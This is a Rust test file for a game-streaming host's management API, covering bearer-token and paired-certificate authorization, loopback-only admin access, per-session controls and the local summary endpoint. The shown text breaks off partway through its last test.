//! Handler + auth tests for the management API, exercised through `app()`.

/// Pins the published `KEY=VALUE` line against both consumers: systemd `EnvironmentFile=`
/// and `windows::service::read_env_file_value`. Re-implements the Windows split so a format
/// change fails here rather than on the platform CI cannot run.
#[test]
fn published_endpoint_line_parses_the_way_both_consumers_read_it() {
    let dir = std::env::temp_dir().join(format!(
        "pf-mgmt-endpoint-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    ));
    std::fs::create_dir_all(&dir).unwrap();
    let path = super::write_endpoint(&dir, 47991).unwrap();
    assert_eq!(path.file_name().unwrap(), super::ENDPOINT_FILE);

    let contents = std::fs::read_to_string(&path).unwrap();
    assert_eq!(contents, "PUNKTFUNK_MGMT_URL=https://127.0.0.1:47991\n");

    let line = contents
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap()
        .trim();
    let value = line.split_once('=').map_or(line, |(_, v)| v).trim();
    assert_eq!(value, "https://127.0.0.1:47991");
    assert!(!value.contains('='));
    // Loopback whatever the listener binds: a 0.0.0.0 bind must never be echoed as a LAN URL.
    assert!(value.starts_with("https://127.0.0.1:"));

    let _ = std::fs::remove_dir_all(&dir);
}

use super::*;

/// Knocks in these tests come from the LAN unless the test is about a WAN knock. An unknown
/// source classifies as WAN, which the approve endpoint refuses.
const LAN_KNOCK: std::net::IpAddr = std::net::IpAddr::V4(std::net::Ipv4Addr::new(192, 168, 1, 44));
use crate::encode::Codec;
#[cfg(feature = "gamestream")]
use crate::gamestream::cert::ServerIdentity;
use crate::gamestream::tls::{PeerAddr, PeerCertFingerprint};
use crate::gamestream::{Host, LaunchSession, HTTPS_PORT, HTTP_PORT};
use axum::body::Body;
use axum::http::StatusCode;
use http_body_util::BodyExt;
use sha2::{Digest, Sha256};
use std::sync::atomic::Ordering;
use tower::ServiceExt;

/// Unique temp dir for the access store; never the host config dir.
fn test_access_dir() -> std::path::PathBuf {
    std::env::temp_dir().join(format!(
        "pf-mgmt-access-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    ))
}

/// Unique temp dir; never the host config dir.
fn test_client_logs_dir() -> std::path::PathBuf {
    std::env::temp_dir().join(format!(
        "pf-mgmt-clientlogs-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    ))
}

/// Unique temp dir; never the host config dir.
fn test_stats() -> Arc<crate::stats_recorder::StatsRecorder> {
    crate::stats_recorder::StatsRecorder::new(std::env::temp_dir().join(format!(
        "pf-mgmt-stats-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    )))
}

fn test_state() -> Arc<AppState> {
    let host = Host {
        hostname: "test-host".into(),
        uniqueid: "deadbeef".into(),
        http_port: HTTP_PORT,
        https_port: HTTPS_PORT,
        os_chain: "linux/arch/steamos".into(),
        os_name: "SteamOS".into(),
    };
    #[cfg(feature = "gamestream")]
    {
        let identity = ServerIdentity::ephemeral().expect("ephemeral identity");
        Arc::new(AppState::new(host, identity, test_stats()))
    }
    #[cfg(not(feature = "gamestream"))]
    {
        Arc::new(AppState::new(host, test_stats()))
    }
}

/// One identified plugin, so the id-scoped routes have something to accept and something to
/// refuse. `demo` owns its own registration; the runner's shared `plugin-secret` is the
/// unidentified lane beside it.
fn test_plugin_tokens() -> std::collections::BTreeMap<String, String> {
    std::collections::BTreeMap::from([("demo".to_string(), "demo-secret".to_string())])
}

fn shared_plugin_tokens(tokens: std::collections::BTreeMap<String, String>) -> super::PluginTokens {
    Arc::new(std::sync::RwLock::new(tokens))
}

// `None` installs "test-secret" (`send` attaches the matching bearer). An explicit token
// is for mismatch cases such as `bearer_token_is_enforced`.
fn test_app(state: Arc<AppState>, token: Option<&str>) -> Router {
    let stats = state.stats.clone();
    app(
        state,
        Some(token.unwrap_or("test-secret").to_string()),
        Some("plugin-secret".to_string()),
        shared_plugin_tokens(test_plugin_tokens()),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        test_access_dir(),
        // GameStream-compat off: the native-only default these tests model.
        false,
        None,
        // No browser plane: the default, and the one that must emit no CORS headers.
        false,
    )
}

/// A host that is serving browsers. Only the CORS lane differs, and it differs entirely.
fn test_app_browser(state: Arc<AppState>) -> Router {
    let stats = state.stats.clone();
    app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        shared_plugin_tokens(test_plugin_tokens()),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        test_access_dir(),
        false,
        None,
        true,
    )
}

fn test_app_native(state: Arc<AppState>, np: Arc<crate::native_pairing::NativePairing>) -> Router {
    // Paired-cert tests inject a fingerprint (cert branch wins); others use `send`'s bearer.
    let stats = state.stats.clone();
    app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        shared_plugin_tokens(test_plugin_tokens()),
        DEFAULT_PORT,
        Some(np),
        stats,
        test_client_logs_dir(),
        test_access_dir(),
        false,
        // A fixed binding, so a device test signs what the host will check.
        Some([0x5a; 32]),
        false,
    )
}

async fn send(app: &Router, mut req: axum::http::Request<Body>) -> (StatusCode, serde_json::Value) {
    // Attach the default bearer unless the test set Authorization (mismatch cases).
    if !req
        .headers()
        .contains_key(axum::http::header::AUTHORIZATION)
    {
        req.headers_mut().insert(
            axum::http::header::AUTHORIZATION,
            axum::http::HeaderValue::from_static("Bearer test-secret"),
        );
    }
    let resp = app.clone().oneshot(req).await.expect("infallible");
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let json = if bytes.is_empty() {
        serde_json::Value::Null
    } else {
        serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
    };
    (status, json)
}

fn get_req(path: &str) -> axum::http::Request<Body> {
    axum::http::Request::get(path).body(Body::empty()).unwrap()
}

/// Cert-only: inject `PeerCertFingerprint` and omit the bearer so `require_auth` takes the cert branch.
async fn send_cert(app: &Router, mut req: axum::http::Request<Body>, fp: &str) -> StatusCode {
    req.extensions_mut()
        .insert(PeerCertFingerprint(Some(fp.to_string())));
    app.clone().oneshot(req).await.expect("infallible").status()
}

/// Discovery reports `permitted` from the live grant mask; invoke 403s without Power and 404s an unknown id.
/// Stored pre-power "Full control" (`GRANT_ALL_PRE_POWER`) still carries Power.
/// Never drive a 202: that would actually suspend the box.
#[tokio::test]
async fn host_actions_follow_the_power_grant() {
    use punktfunk_core::quic::{GRANT_ALL_PRE_POWER, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-actions-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let guest_fp = "aaaa00000001";
    let owner_fp = "bbbb00000002";
    let legacy_fp = "cccc00000003";
    np.add_with_access(
        "guest",
        guest_fp,
        Some(crate::native_pairing::Access {
            grants: GRANT_GAMEPAD,
            expires_unix: None,
            until_disconnect: false,
        }),
    )
    .unwrap();
    np.add("owner", owner_fp).unwrap(); // absent grants = full control, including Power
    np.add_with_access(
        "legacy",
        legacy_fp,
        Some(crate::native_pairing::Access {
            grants: GRANT_ALL_PRE_POWER,
            expires_unix: None,
            until_disconnect: false,
        }),
    )
    .unwrap();
    let app = test_app_native(test_state(), np);

    let discover = |fp: &str| {
        let mut req = get_req("/api/v1/actions");
        req.extensions_mut()
            .insert(PeerCertFingerprint(Some(fp.to_string())));
        req
    };
    let (status, body) = send(&app, discover(guest_fp)).await;
    assert_eq!(status, StatusCode::OK);
    let rows = body["actions"].as_array().unwrap();
    assert_eq!(rows.len(), 5, "{body}");
    assert!(
        rows.iter().all(|a| a["permitted"] == false),
        "a controller-only guest must not be offered power: {body}"
    );
    for fp in [owner_fp, legacy_fp] {
        let (_, body) = send(&app, discover(fp)).await;
        assert!(
            body["actions"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|a| a["group"] != "display")
                .all(|a| a["permitted"] == true),
            "full control (current or legacy-stored) carries Power: {body}"
        );
    }
    // Admin bearer without a cert is the console/owner surface: everything permitted.
    let (_, body) = send(&app, get_req("/api/v1/actions")).await;
    assert!(body["actions"]
        .as_array()
        .unwrap()
        .iter()
        .all(|a| a["permitted"] == true));

    let post = |path: &str| axum::http::Request::post(path).body(Body::empty()).unwrap();
    // Typed 403 without the grant; unpaired never reaches this handler.
    assert_eq!(
        send_cert(&app, post("/api/v1/actions/power.sleep"), guest_fp).await,
        StatusCode::FORBIDDEN,
        "no Power bit ⇒ 403"
    );
    // Unknown id 404s before grant or platform checks.
    let (status, _) = send(&app, post("/api/v1/actions/no.such")).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

/// `display.next` follows the caller's own live session, never the Host power grant, and a
/// refusal ends nothing. Never invoked with a pass: `policy::prefs()` is the developer's own
/// `display-settings.json`, so a pinned two-head box would really switch.
#[tokio::test]
async fn display_next_follows_the_live_session_not_the_power_grant() {
    use punktfunk_core::quic::GRANT_GAMEPAD;
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir()
                    .join(format!("pf-mgmt-display-next-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let streaming_fp = "aaaa00000011"; // controller-only, streaming
    let idle_fp = "bbbb00000012"; // full control, nothing live
    np.add_with_access(
        "streaming",
        streaming_fp,
        Some(crate::native_pairing::Access {
            grants: GRANT_GAMEPAD,
            expires_unix: None,
            until_disconnect: false,
        }),
    )
    .unwrap();
    np.add("idle", idle_fp).unwrap();
    let app = test_app_native(test_state(), np);
    let (_live, stop, quit, _) = fake_session_with_flags(streaming_fp);

    let display_next = |body: &serde_json::Value| {
        body["actions"]
            .as_array()
            .unwrap()
            .iter()
            .find(|a| a["id"] == "display.next")
            .cloned()
            .unwrap_or_else(|| panic!("display.next is always listed: {body}"))
    };
    let discover = |fp: Option<&str>| {
        let mut req = get_req("/api/v1/actions");
        if let Some(fp) = fp {
            req.extensions_mut()
                .insert(PeerCertFingerprint(Some(fp.to_string())));
        }
        req
    };
    let row = display_next(&send(&app, discover(Some(streaming_fp))).await.1);
    assert_eq!(
        row["permitted"], true,
        "its own session, no grant bit: {row}"
    );
    assert_eq!(row["group"], "display");
    assert_eq!(row["danger"], false);
    let row = display_next(&send(&app, discover(Some(idle_fp))).await.1);
    assert_eq!(
        row["permitted"], false,
        "Host power is not a session: {row}"
    );
    let row = display_next(&send(&app, discover(None)).await.1);
    assert_eq!(row["permitted"], true, "the console may always: {row}");

    // Down the power path this device has the grant and would meet the other live device's
    // 409 instead.
    let post = axum::http::Request::post("/api/v1/actions/display.next")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send_cert(&app, post, idle_fp).await, StatusCode::FORBIDDEN);
    assert!(
        !stop.load(Ordering::SeqCst) && !quit.load(Ordering::SeqCst),
        "a display action ends no session"
    );
}

/// A paired streaming cert reaches only the read-only allowlist; PIN and mutating routes need the operator bearer.
#[tokio::test]
async fn cert_auth_is_a_read_only_allowlist() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-cert-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let fp = "deadbeefcafe";
    np.add("streaming-client", fp).unwrap();
    let app = test_app_native(test_state(), np);

    for p in [
        "/api/v1/host",
        "/api/v1/status",
        "/api/v1/compositors",
        "/api/v1/library",
    ] {
        assert_ne!(
            send_cert(&app, get_req(p), fp).await,
            StatusCode::UNAUTHORIZED,
            "a paired streaming cert should authorize GET {p}"
        );
    }
    // Roster GETs are token-only: one cert must not list every other device's name + fingerprint.
    for p in ["/api/v1/clients", "/api/v1/native/clients"] {
        assert_eq!(
            send_cert(&app, get_req(p), fp).await,
            StatusCode::UNAUTHORIZED,
            "the client roster {p} must require the bearer token, not just a paired cert"
        );
    }
    // Exact `/api/v1/library` cert match must not leak `/library/scanners`.
    assert_eq!(
        send_cert(&app, get_req("/api/v1/library/scanners"), fp).await,
        StatusCode::UNAUTHORIZED,
        "the scanner settings must require the bearer token, not just a paired cert"
    );
    for p in [
        "/api/v1/plugins",
        "/api/v1/plugins/rom-manager/ui-credential",
    ] {
        assert_eq!(
            send_cert(&app, get_req(p), fp).await,
            StatusCode::UNAUTHORIZED,
            "the plugin directory {p} must require the bearer token, not just a paired cert"
        );
    }
    assert_eq!(
        send_cert(&app, get_req("/api/v1/native/pair"), fp).await,
        StatusCode::UNAUTHORIZED,
        "GET /native/pair exposes the PIN → must require the bearer token"
    );
    assert_eq!(
        send_cert(
            &app,
            post_json(
                "/api/v1/native/pair/arm",
                serde_json::json!({"ttl_secs": 60})
            ),
            fp,
        )
        .await,
        StatusCode::UNAUTHORIZED,
        "arming pairing must require the bearer token"
    );
    assert_eq!(
        send_cert(
            &app,
            axum::http::Request::delete("/api/v1/native/clients/deadbeefcafe")
                .body(Body::empty())
                .unwrap(),
            fp,
        )
        .await,
        StatusCode::UNAUTHORIZED,
        "unpair (DELETE) must require the bearer token"
    );
    assert_eq!(
        send_cert(&app, get_req("/api/v1/status"), "not-paired").await,
        StatusCode::UNAUTHORIZED,
        "an unpaired cert must be rejected"
    );
}

/// Admin bearer is loopback-only so an all-interfaces bind never LAN-exposes the console token.
/// A paired cert still reaches the read-only allowlist from a LAN peer.
#[tokio::test]
async fn bearer_admin_is_loopback_only() {
    let lan: SocketAddr = "192.168.1.50:54321".parse().unwrap();
    let loopback: SocketAddr = "127.0.0.1:33333".parse().unwrap();
    let bearer = |peer: SocketAddr| {
        let mut req = get_req("/api/v1/stats/recordings"); // bearer-only admin route
        req.extensions_mut().insert(PeerAddr(peer));
        req.headers_mut().insert(
            axum::http::header::AUTHORIZATION,
            axum::http::HeaderValue::from_static("Bearer test-secret"),
        );
        req
    };

    let app = test_app(test_state(), None);
    assert_eq!(
        app.clone()
            .oneshot(bearer(lan))
            .await
            .expect("infallible")
            .status(),
        StatusCode::UNAUTHORIZED,
        "a bearer token from a LAN peer must be rejected on the admin API"
    );
    assert_ne!(
        app.clone()
            .oneshot(bearer(loopback))
            .await
            .expect("infallible")
            .status(),
        StatusCode::UNAUTHORIZED,
        "the bearer token must be accepted from a loopback peer"
    );

    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-lanlib-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let fp = "deadbeefcafe";
    np.add("lan-client", fp).unwrap();
    let app = test_app_native(test_state(), np);
    let mut req = get_req("/api/v1/library");
    req.extensions_mut().insert(PeerAddr(lan));
    req.extensions_mut()
        .insert(PeerCertFingerprint(Some(fp.to_string())));
    assert_ne!(
        app.clone().oneshot(req).await.expect("infallible").status(),
        StatusCode::UNAUTHORIZED,
        "a paired cert must reach the library from a LAN peer"
    );

    // Art proxy is a prefix match in `cert_may_access` (dynamic id/kind). Unknown kind 404s
    // before I/O, so this is the auth gate, not art resolution (`library::tests`).
    let mut req = get_req("/api/v1/library/art/steam:570/not-a-real-kind");
    req.extensions_mut().insert(PeerAddr(lan));
    req.extensions_mut()
        .insert(PeerCertFingerprint(Some(fp.to_string())));
    assert_eq!(
        app.clone().oneshot(req).await.expect("infallible").status(),
        StatusCode::NOT_FOUND,
        "a paired cert must reach the per-image library art proxy from a LAN peer \
         (and an unknown kind 404s, rather than ever being rejected as unauthorized)"
    );
}

#[tokio::test]
async fn health_is_open_and_versioned() {
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/health")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["status"], "ok");
    assert_eq!(body["abi_version"], punktfunk_core::ABI_VERSION);
}

fn summary_req() -> axum::http::Request<Body> {
    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("127.0.0.1:40000".parse().unwrap()));
    req
}

fn fake_native_session(
    width: u32,
    height: u32,
    fps: u32,
) -> crate::session_status::LiveSessionGuard {
    let packed = ((width as u64) << 32) | ((height as u64) << 16) | fps as u64;
    crate::session_status::register(crate::session_status::Registration {
        mode: Arc::new(std::sync::atomic::AtomicU64::new(packed)),
        bitrate_kbps: Arc::new(std::sync::atomic::AtomicU32::new(20_000)),
        codec: Codec::H265,
        stop: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        quit: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        force_idr: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        client: "test-client".into(),
        plane: crate::events::Plane::Native,
        client_name: Some("studio-deck".into()),
        hdr: false,
        ttff_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
        last_resize_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
        // Desktop stream: no game row.
        game: None,
        capture_health: Arc::new(std::sync::Mutex::new(None)),
        join: false,
        controls: crate::session_status::SessionControls::open(),
        bit_depth: 8,
        chroma: crate::encode::ChromaFormat::Yuv420,
        end_reason: Arc::new(std::sync::atomic::AtomicU8::new(0)),
        counters: Arc::new(crate::session_status::SessionCounters::default()),
        peer: None,
    })
}

/// A live session plus the flags a stop sets. `fake_native_session` is the same thing
/// where only the `/status` shape matters.
fn fake_session_with_flags(
    client: &str,
) -> (
    crate::session_status::LiveSessionGuard,
    Arc<std::sync::atomic::AtomicBool>,
    Arc<std::sync::atomic::AtomicBool>,
    Arc<std::sync::atomic::AtomicBool>,
) {
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let quit = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let idr = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let controls = crate::session_status::SessionControls::open();
    // Controller-only pairing: the ceiling every per-session re-point below is clamped to.
    controls.ceiling.store(
        punktfunk_core::quic::GRANT_PRESET_CONTROLLER_ONLY,
        Ordering::Relaxed,
    );
    controls.grants.store(
        punktfunk_core::quic::GRANT_PRESET_CONTROLLER_ONLY,
        Ordering::Relaxed,
    );
    let guard = crate::session_status::register(crate::session_status::Registration {
        mode: Arc::new(std::sync::atomic::AtomicU64::new(
            (1920u64 << 32) | (1080u64 << 16) | 60,
        )),
        bitrate_kbps: Arc::new(std::sync::atomic::AtomicU32::new(20_000)),
        codec: Codec::H265,
        stop: stop.clone(),
        quit: quit.clone(),
        force_idr: idr.clone(),
        client: client.into(),
        client_name: None,
        plane: crate::events::Plane::Native,
        hdr: false,
        ttff_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
        last_resize_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
        game: None,
        capture_health: Arc::new(std::sync::Mutex::new(None)),
        join: false,
        controls,
        bit_depth: 8,
        chroma: crate::encode::ChromaFormat::Yuv420,
        end_reason: Arc::new(std::sync::atomic::AtomicU8::new(0)),
        counters: Arc::new(crate::session_status::SessionCounters::default()),
        peer: None,
    });
    (guard, stop, quit, idr)
}

/// Every per-session route on an id nothing is streaming: a 404 in the ApiError envelope,
/// never a panic and never another session's teardown.
#[tokio::test]
async fn a_per_session_route_404s_an_unknown_id() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);
    let (_live, stop, _quit, idr) = fake_session_with_flags("aabbccddeeff");
    let ghost = u64::MAX;

    for req in [
        axum::http::Request::delete(format!("/api/v1/session/{ghost}"))
            .body(Body::empty())
            .unwrap(),
        axum::http::Request::post(format!("/api/v1/session/{ghost}/idr"))
            .body(Body::empty())
            .unwrap(),
        put_json(
            &format!("/api/v1/session/{ghost}/audio"),
            serde_json::json!({ "muted": true }),
        ),
        put_json(
            &format!("/api/v1/session/{ghost}/access"),
            serde_json::json!({ "level": "view" }),
        ),
    ] {
        let (status, body) = send(&app, req).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        assert!(body["error"].is_string(), "ApiError envelope: {body}");
    }
    assert!(
        !stop.load(Ordering::SeqCst),
        "the live session is untouched"
    );
    assert!(!idr.load(Ordering::Relaxed));
}

/// `GET /session/last` answers a host that has streamed and a host that has not: a list,
/// never a 404 and never a 500. A stopped session arrives on it with the reason attached.
#[tokio::test]
async fn the_last_session_route_answers_before_and_after_a_session() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/session/last")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        body["sessions"].is_array(),
        "always a list, empty on a host that has not streamed: {body}"
    );

    let one = fake_session_with_flags("aabbccddeeff").0;
    let id = one.id;
    let del = axum::http::Request::delete(format!("/api/v1/session/{id}"))
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    drop(one);

    let (status, body) = send(&app, get_req("/api/v1/session/last")).await;
    assert_eq!(status, StatusCode::OK);
    // By id: the ring is process-global and bounded, so a count is not a claim.
    let mine = body["sessions"]
        .as_array()
        .expect("a list")
        .iter()
        .find(|s| s["id"] == id)
        .unwrap_or_else(|| panic!("session {id} is on the list: {body}"));
    assert_eq!(mine["ended"], "stopped_by_operator");
    assert_eq!(mine["mode"], "1920x1080@60");
    assert_eq!(mine["codec"], "hevc");
    // No video loop ran, so it has no totals to claim — absent, not zero.
    assert!(mine.get("frames_sent").is_none(), "{mine}");
}

/// The point of the whole issue: with two clients on one host, stopping one must leave the
/// other streaming — and the id-less `DELETE /session` must still take both.
#[tokio::test]
async fn a_per_session_stop_drops_only_that_session() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);
    let (one, stop1, quit1, idr1) = fake_session_with_flags("aabbccddeeff");
    let (_two, stop2, quit2, idr2) = fake_session_with_flags("112233445566");

    let del = axum::http::Request::delete(format!("/api/v1/session/{}", one.id))
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    assert!(stop1.load(Ordering::SeqCst) && quit1.load(Ordering::SeqCst));
    assert!(
        !stop2.load(Ordering::SeqCst),
        "the other client keeps streaming"
    );

    // Same for the keyframe: one id, one encoder.
    let post = axum::http::Request::post(format!("/api/v1/session/{}/idr", one.id))
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, post).await.0, StatusCode::ACCEPTED);
    assert!(idr1.load(Ordering::Relaxed));
    assert!(!idr2.load(Ordering::Relaxed));

    // The id-less form is unchanged: every live session, as every existing caller expects.
    let all = axum::http::Request::delete("/api/v1/session")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, all).await.0, StatusCode::NO_CONTENT);
    assert!(stop2.load(Ordering::SeqCst) && quit2.load(Ordering::SeqCst));
}

/// Mute is per session: the other client on the same display keeps its audio, and the
/// state is on `/status` so the operator sees why one of them is silent.
///
/// The wire half — that a muted session stops sending datagrams — needs two real clients
/// on a real host; this covers the flag the audio thread reads.
#[tokio::test]
async fn muting_one_session_leaves_the_other_hearing() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);
    let (one, ..) = fake_session_with_flags("aabbccddeeff");
    let (two, ..) = fake_session_with_flags("112233445566");
    let muted = |id: u64| {
        crate::session_status::controls(id)
            .unwrap()
            .muted
            .load(Ordering::SeqCst)
    };

    let (status, _) = send(
        &app,
        put_json(
            &format!("/api/v1/session/{}/audio", one.id),
            serde_json::json!({ "muted": true }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    assert!(muted(one.id));
    assert!(
        !muted(two.id),
        "the session sharing the sink still hears it"
    );

    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    let row = |id: u64| {
        body["sessions"]
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["id"] == id)
            .cloned()
            .unwrap()
    };
    assert_eq!(row(one.id)["muted"], true, "{body}");
    assert_eq!(row(two.id)["muted"], false);

    // Unmute puts it back without touching the sibling.
    let (status, _) = send(
        &app,
        put_json(
            &format!("/api/v1/session/{}/audio", one.id),
            serde_json::json!({ "muted": false }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    assert!(!muted(one.id));
}

/// The operator places one session's player: the pick lands on that row of `/status`
/// and nothing else, and it can be handed back.
///
/// Whether the pool actually hands that slot over is pinned in `pf_inject::pad_pool`
/// against a private pool — the process-wide one is shared with every other test here.
#[tokio::test]
async fn placing_a_player_touches_only_that_session() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);
    let (one, ..) = fake_session_with_flags("aabbccddeeff");
    let (two, ..) = fake_session_with_flags("112233445566");
    let pick =
        |id: u64, body: serde_json::Value| put_json(&format!("/api/v1/session/{id}/player"), body);

    // Past the host's slot count: refused, so no console can store a slot no pad can take.
    let (status, _) = send(&app, pick(one.id, serde_json::json!({ "slot": 16 }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    // An id nothing is streaming is never another session's controllers.
    let ghost = one.id + two.id + 1000;
    let (status, _) = send(&app, pick(ghost, serde_json::json!({ "slot": 1 }))).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    let (status, body) = send(&app, pick(one.id, serde_json::json!({ "slot": 1 }))).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["slot"], 1, "{body}");

    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    let row = |id: u64| {
        body["sessions"]
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["id"] == id)
            .cloned()
            .unwrap()
    };
    assert_eq!(row(one.id)["preferred_pad_slot"], 1, "{body}");
    assert!(
        row(two.id)["preferred_pad_slot"].is_null(),
        "the other session keeps the first-free claim"
    );
    // Both rows carry the pads column whether or not anything is placed.
    assert_eq!(row(two.id)["pads"], serde_json::json!([]));

    // Handing it back leaves the row unplaced again.
    let (status, _) = send(&app, pick(one.id, serde_json::json!({ "slot": null }))).await;
    assert_eq!(status, StatusCode::OK);
    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    assert!(body["sessions"]
        .as_array()
        .unwrap()
        .iter()
        .all(|r| r["preferred_pad_slot"].is_null()));
}

/// A live re-point moves the mask the input thread reads, and cannot widen past the
/// pairing: these sessions are paired controller-only, so `full` comes back clamped.
#[tokio::test]
async fn a_live_access_change_applies_to_the_running_session() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);
    let (one, ..) = fake_session_with_flags("aabbccddeeff");
    let (two, ..) = fake_session_with_flags("112233445566");
    let grants = |id: u64| {
        crate::session_status::controls(id)
            .unwrap()
            .grants
            .load(Ordering::Relaxed)
    };
    let before_other = grants(two.id);

    let (status, body) = send(
        &app,
        put_json(
            &format!("/api/v1/session/{}/access", one.id),
            serde_json::json!({ "level": "view" }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["level"], "view", "{body}");
    assert_eq!(
        grants(one.id),
        punktfunk_core::quic::GRANT_PRESET_VIEW_ONLY,
        "the live mask moved, with no reconnect"
    );
    assert_eq!(
        grants(two.id),
        before_other,
        "the other session is untouched"
    );

    // Handing the pad back: `full` is asked for, the controller-only pairing is what lands.
    let (status, body) = send(
        &app,
        put_json(
            &format!("/api/v1/session/{}/access", one.id),
            serde_json::json!({ "level": "full" }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        body["grants"].as_u64().unwrap() as u32,
        punktfunk_core::quic::GRANT_PRESET_CONTROLLER_ONLY,
        "clamped to the pairing's ceiling: {body}"
    );
    assert_eq!(
        grants(one.id),
        punktfunk_core::quic::GRANT_PRESET_CONTROLLER_ONLY
    );

    // Neither field, an unknown level, and a reserved bit are all 400s.
    for bad in [
        serde_json::json!({}),
        serde_json::json!({ "level": "admin" }),
        serde_json::json!({ "grants": punktfunk_core::quic::GRANT_RESERVED }),
    ] {
        let (status, body) = send(
            &app,
            put_json(&format!("/api/v1/session/{}/access", one.id), bad),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"].is_string());
    }
}

/// A native session must read as streaming in `/local/summary`. The GameStream `streaming` flag
/// stays false for the whole native stream, so the tray must not key off that flag alone.
#[tokio::test]
async fn local_summary_reports_a_native_session_as_streaming() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, summary_req()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["session"], serde_json::Value::Null);

    let session = fake_native_session(3840, 2160, 120);
    let (_, body) = send(&app, summary_req()).await;
    assert_eq!(body["video_streaming"], true, "native session: {body}");
    assert_eq!(body["audio_streaming"], true, "native session: {body}");
    assert_eq!(body["session"]["width"], 3840);
    assert_eq!(body["session"]["height"], 2160);
    assert_eq!(body["session"]["fps"], 120);
    // Live `client_name` is for the tray connect toast; idle-side is the next test.
    assert_eq!(body["client_name"], "studio-deck");

    drop(session);
    let (_, body) = send(&app, summary_req()).await;
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["session"], serde_json::Value::Null);
    assert_eq!(
        body["client_name"],
        serde_json::Value::Null,
        "no live session → no client name in the summary"
    );
}

/// `/local/summary` is unauthenticated for loopback only. The body must not carry PINs,
/// fingerprints, or a paired-but-idle device's name. This test pairs a device and registers
/// no session so `client_name` stays absent.
#[tokio::test]
async fn local_summary_is_loopback_only_and_non_sensitive() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-summary-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    np.add("secret-device-name", "deadbeefcafe0123").unwrap();
    let app = test_app_native(test_state(), np);

    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("127.0.0.1:40000".parse().unwrap()));
    let (status, body) = send(&app, req).await;
